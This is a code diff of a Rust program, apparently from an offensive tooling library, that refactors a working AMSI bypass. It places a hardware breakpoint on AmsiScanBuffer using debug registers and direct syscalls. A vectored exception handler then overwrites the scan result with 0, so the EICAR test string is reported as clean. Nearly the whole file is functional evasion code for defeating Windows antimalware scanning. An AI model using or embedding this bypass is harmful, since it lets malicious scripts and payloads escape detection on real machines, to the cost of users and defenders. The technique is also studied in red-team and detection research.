@@ -2,19 +2,23 @@
 
 
 use std::ffi::CString;
+use std::mem::transmute;
 use std::ptr::null_mut;
 
-use winapi::ctypes::c_void;
-use winapi::shared::minwindef::ULONG;
-use winapi::shared::ntdef::HRESULT;
-use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
-use winapi::um::libloaderapi::LoadLibraryA;
-use winapi::um::minwinbase::EXCEPTION_SINGLE_STEP;
-use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, HANDLE, PEXCEPTION_POINTERS, PVOID};
-use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
+use ntapi::ntpsapi::NtCurrentThread;
+use winapi::{
+	ctypes::c_void,
+	shared::minwindef::ULONG,
+	shared::ntdef::HRESULT,
+	um::{
+		errhandlingapi::AddVectoredExceptionHandler,
+		libloaderapi::LoadLibraryA,
+		winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, PVOID}
+	}
+};
 
-use thermite::{direct_syscall, info};
-use thermite::breakpoints::{get_arguments, search_breakpoint};
+use thermite::{direct_syscall, error, info};
+use thermite::breakpoints::{DebugRegister, get_arguments, rip_to_return_address, set_breakpoint, set_resume_flag, set_ret_value};
 use thermite::peb_walk::{get_function_address, get_module_handle};
 
 
@@ -23,6 +27,7 @@ pub type HAMSISESSION = *mut c_void;
 pub type AMSI_RESULT = i32;
 pub type LPCWSTR = *const u16;
 pub type LPCVOID = *const c_void;
+
 #[link(name="amsi")]
 extern "system" {
 	pub fn AmsiInitialize(appName: LPCWSTR, amsiContext: *mut HAMSICONTEXT) -> HRESULT;
@@ -39,74 +44,102 @@ extern "system" {
 	) -> HRESULT;
 }
 
+
+// This function sets up the hardware breakpoint
+// It will load AMSI.dll if it is not already loaded, so it can find the address of AmsiScanBuffer
+// Then set up a hook with hardware breakpoints at the function's address, so we can hijack the execution 
 fn setup() -> Result<PVOID, String> {
-	let procaddr: *const u8;
+	let amsiscanbuffer_ptr: *const u8;
 	let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
 	thread_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
 	unsafe {
 		let module_name = CString::new("amsi.dll").unwrap();
 		let modhandle = get_module_handle("amsi.dll").unwrap_or(LoadLibraryA(module_name.as_ptr()));
-		procaddr = get_function_address("AmsiScanBuffer", modhandle as _).unwrap();
-		if procaddr.is_null() { return Err("Failed to get AmsiScanBuffer address".to_string()) };
+		amsiscanbuffer_ptr = get_function_address("AmsiScanBuffer", modhandle as _).unwrap();
+		if amsiscanbuffer_ptr.is_null() { return Err("Failed to get AmsiScanBuffer address".to_string()) };
 	}
-
-	let veh = unsafe { AddVectoredExceptionHandler(1, Some(vectored_handler)) };
+	
+	// We register our VEH, i just use the one i made in thermite::breakpoints, no reason to change something that works
+	let veh = unsafe { AddVectoredExceptionHandler(1, Some(thermite::breakpoints::vectored_handler)) };
 	if veh.is_null() { return Err("Failed to add exception handler".to_string()) };
 
-	let status = direct_syscall!("NtGetContextThread", -2i32 as HANDLE, &mut thread_ctx);
+	let status = direct_syscall!("NtGetContextThread", NtCurrentThread, &mut thread_ctx);
 	if status != 0 { return Err(format!("Failed to get context thread: {status:x}")) };
 
-	// Set the breakpoint address to DR0, then enable DR0 by setting the first bit of DR7 to 1
-	thread_ctx.Dr0 = procaddr as u64;
-	thread_ctx.Dr7 |= 1;
+	// Sets the breakpoint address (amsiscanbuffer_ptr) to DR0 and saves our callback to the callback table
+	unsafe { set_breakpoint(DebugRegister::DR0, amsiscanbuffer_ptr, &mut thread_ctx, transmute(callback as fn(_))) };
 
-	let status = direct_syscall!("NtSetContextThread", -2i32 as HANDLE, &mut thread_ctx);
+	// Set the context - "Saves" our breakpoints 
+	let status = direct_syscall!("NtSetContextThread", NtCurrentThread, &mut thread_ctx);
 	if status != 0 { return Err(format!("Failed to set context thread: {status:x}")) };
 	Ok(veh)
 }
 
-fn test_amsi() -> Result<(), String> {
+// Simple function that calls AmsiScanBuffer on the EICAR test string and display the results
+// The EICAR string is a test string used as a test for antiviruses, 
+// it's pretty much universally recognized as an IOC and should be detected by every half-decent security product 
+// So if we can get this past AMSI, i think we're good
+fn scan_sample(amsi_ctx: *mut c_void, amsi_session: *mut c_void, mut res: HRESULT) -> HRESULT {
 	let eicar_string = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
 	let name_utf16: Vec<u16> = "TestSession123".encode_utf16().chain(std::iter::once(0)).collect();
+	
+	unsafe { AmsiScanBuffer(
+		amsi_ctx,
+		eicar_string.as_ptr() as *const c_void,
+		eicar_string.len() as ULONG,
+		name_utf16.as_ptr(),
+		amsi_session,
+		&mut res) };
+	println!("\t> Scan Result: {res:#x}");
+	match res { 
+		0 => println!("\t> The sample is clean"),
+		1 => println!("\t> The sample may be clean"),
+		0x4000..=0x4fff => println!("\t> The scan was blocked by an admin"),
+		0x8000.. => println!("\t> The sample is definitely malware"),
+		_ => println!("\t> ???"),
+	}
+	res
+}
 
+
+fn callback(ctx: &mut CONTEXT) {
+	let result_ptr = get_arguments(ctx, 5) as *mut u32;
+	
+	// The last argument of AmsiScanBuffer is a pointer to the results ( &mut results )
+	// So we need to derefence it to access its value or to modify it
+	unsafe { println!("\t> AMSI really scanned: {:#x}", (*result_ptr)); }
+	info!("But let's change it to 0 o/");
+	unsafe { *result_ptr = 0; }
+
+	rip_to_return_address(ctx);     // We set the instruction pointer to the return address
+	set_ret_value(0, ctx);    // We set the return value to 0 (meaning everything is okay, c.f. AmsiScanBuffer's signature)
+	set_resume_flag(ctx)            // We set the resume flag to 1 to allow AmsiScanBuffer to continue executing (but only to return)
+}
+
+fn main() {
+	// Initializing some stuff for AMSI
 	let mut amsi_ctx = null_mut();
 	let mut amsi_session = null_mut();
-	let mut res = unsafe { AmsiInitialize(name_utf16.as_ptr(), &mut amsi_ctx) };
-	if res != 0 { return Err("Failed to initialize AMSI".to_string()); }
+	let res = unsafe { AmsiInitialize("Test Name".encode_utf16().collect::<Vec<u16>>().as_ptr(), &mut amsi_ctx) };
+	if res != 0 { error!("Failed to initialize AMSI..."); return; }
 	unsafe { AmsiOpenSession(amsi_ctx, &mut amsi_session) };
 
+	// Then we scan a first sample, before the bypass is set
 	info!("Scanning the sample...");
-	unsafe { AmsiScanBuffer(
-		amsi_ctx,
-		eicar_string.as_ptr() as *const c_void,
-		eicar_string.len() as ULONG,
-		name_utf16.as_ptr(),
-		amsi_session,
-		&mut res) };
-	println!("\t> Scan Result: {res:#x}");
-	match res { 0 => println!("\t> The sample is clean"),
-				1 => println!("\t> The sample may be clean"),
-  0x4000..=0x4fff => println!("\t> The scan was blocked by an admin"),
-		 0x8000.. => println!("\t> The sample is definitely malware"),
-				_ => println!("\t> ???")}
+	scan_sample(amsi_ctx, amsi_session, res);
 
-	match setup() { Ok(_) => { info!("Successfully set up breakpoint") }, Err(e) => return Err(e) };
+	// Set-up the bypass and handle any potential errors
+	match setup() {
+		Ok(_) => { info!("Successfully set up breakpoint") },
+		Err(e) => { error!(e); }
+	};
 
+	// We scan the sample a second time, this time with the hardware breakpoint set at AmsiScanBuffer's address
 	info!("Let's scan the same sample with the bypass active");
-	unsafe { AmsiScanBuffer(
-		amsi_ctx,
-		eicar_string.as_ptr() as *const c_void,
-		eicar_string.len() as ULONG,
-		name_utf16.as_ptr(),
-		amsi_session,
-		&mut res) };
-	println!("\t> Scan Result: {res:#x}");
-	match res { 0 => println!("\t> The sample is clean"),
-				1 => println!("\t> The sample may be clean"),
-  0x4000..=0x4fff => println!("\t> The scan was blocked by an admin"),
-		 0x8000.. => println!("\t> The sample is definitely malware"),
-				_ => println!("\t> ???")}
+	scan_sample(amsi_ctx, amsi_session, res);
+	
+	// res == 0 means AMSI said the sample was clean :D 
 	if res == 0 {
 		println!("[^o^]/ Hell yeah !");
 	}
@@ -115,40 +148,4 @@ fn test_amsi() -> Result<(), String> {
 		AmsiCloseSession(amsi_ctx, amsi_session);
 		AmsiUninitialize(amsi_ctx);
 	}
-
-	Ok(())
-}
-
-pub unsafe extern "system" fn vectored_handler(exception_info: PEXCEPTION_POINTERS) -> i32 {
-	unsafe {
-		let rec = &(*(*exception_info).ExceptionRecord);
-		let ctx = &mut (*(*exception_info).ContextRecord);
-		if rec.ExceptionCode == EXCEPTION_SINGLE_STEP && search_breakpoint(rec.ExceptionAddress, ctx).is_some() {
-			info!("Hardware Breakpoint Hit ! Time for mischief !");
-			callback(ctx);
-			return EXCEPTION_CONTINUE_EXECUTION;
-		}
-		EXCEPTION_CONTINUE_SEARCH
-	}
-}
-
-fn callback(ctx: &mut CONTEXT) {
-	// The last argument should be a pointer to the result of the scan
-	let result_ptr = get_arguments(ctx, 5) as *mut u32;
-	let scan_res = unsafe { *result_ptr };
-	println!("\t> AMSI really scanned: {scan_res:#x}");
-	info!("But let's change it to 0 o/");
-	unsafe { *result_ptr = 0; }
-
-	// Set Instruction pointer to the last return value on the stack
-	unsafe { ctx.Rip = *(ctx.Rsp as *const u64); }
-	ctx.Rsp += std::mem::size_of::<*const u64>() as u64;
-
-	ctx.Rax = 0;         // Set 0 as return value
-	ctx.EFlags |= 1<<16; // Set Resume Flag to 1
-}
-
-
-fn main() {
-	test_amsi().unwrap();
 }
